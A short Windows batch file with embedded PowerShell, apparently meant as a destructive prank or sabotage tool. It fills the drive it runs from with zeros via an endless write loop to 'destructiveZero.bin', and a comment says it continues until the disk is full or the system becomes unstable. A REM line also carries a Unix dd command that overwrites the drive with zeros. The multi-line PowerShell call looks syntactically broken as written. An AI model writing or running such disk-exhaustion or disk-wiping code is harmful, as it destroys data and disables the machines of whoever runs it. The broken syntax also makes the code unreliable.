REM dd if=/dev/zero of=%~d0 bs=1M

@echo off
SET ScriptPath=%~dp0
SET ScriptName=%~nx0

PowerShell -Command "& {
    $drive = Split-Path -Path '%ScriptPath%' -Root
    $blockSize = 1MB
    $filePath = Join-Path -Path $drive -ChildPath 'destructiveZero.bin'

    $fs = [System.IO.File]::Create($filePath)
    $bytes = New-Object byte[] $blockSize

    try {
        while ($true) {
            $fs.Write($bytes, 0, $bytes.Length)
            $fs.Flush()
        }
    } catch {
        # Ignore exceptions and continue until the disk is full or system becomes unstable
    } finally {
        $fs.Close()
    }
}"
